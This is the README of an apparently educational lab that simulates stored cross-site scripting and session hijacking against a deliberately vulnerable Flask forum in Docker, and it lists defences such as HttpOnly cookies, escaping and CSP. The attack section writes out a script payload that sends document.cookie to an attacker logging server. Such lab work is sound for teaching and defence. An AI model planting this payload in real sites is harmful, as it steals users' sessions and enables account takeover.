# Stored XSS Attack & Defense Simulation (Python / Flask / Docker)

A practical cybersecurity laboratory project demonstrating the end-to-end lifecycle of a **Stored Cross-Site Scripting (XSS)** vulnerability, session hijacking, and multi-layered defense strategies.

## 🛠️ Tech Stack
* **Backend:** Python, Flask, Jinja2
* **Infrastructure:** Docker & Docker Compose (Isolated Container Environment)
* **Security Concepts:** Session Hijacking, `HttpOnly` Cookies, Output Encoding (`html.escape`), Sanitization (`bleach`), and Content Security Policy (CSP).

---

## 🎯 Project Overview
This project simulates an insecure web forum where user-submitted messages are persistently stored and rendered back to other users. Due to intentional misconfigurations (disabled auto-escaping via Jinja2's `| safe` filter and missing input validation), an attacker can inject malicious JavaScript payloads.

The project is split into two isolated Docker containers:
1. **Forum Server (Port 8080):** A vulnerable Flask application managing user authentication and a message board.
2. **Attacker Server (Port 9090):** A dedicated logging server designed to capture exfiltrated session cookies (`session_id`).

---

## 🚀 Attack Simulation
1. **Authentication:** The attacker logs into the forum and injects a persistent payload into the message board:
   ```html
   <script>fetch('http://localhost:9090/log?cookie=' + document.cookie);</script>
2.**Execution**: When an authenticated victim visits the forum page, their browser executes the script, reading document.cookie and exfiltrating the session identifier via an out-of-band HTTP request.

3.**Session** Hijacking: The attacker receives and logs the session cookie, demonstrating complete identity theft and bypass of access controls.
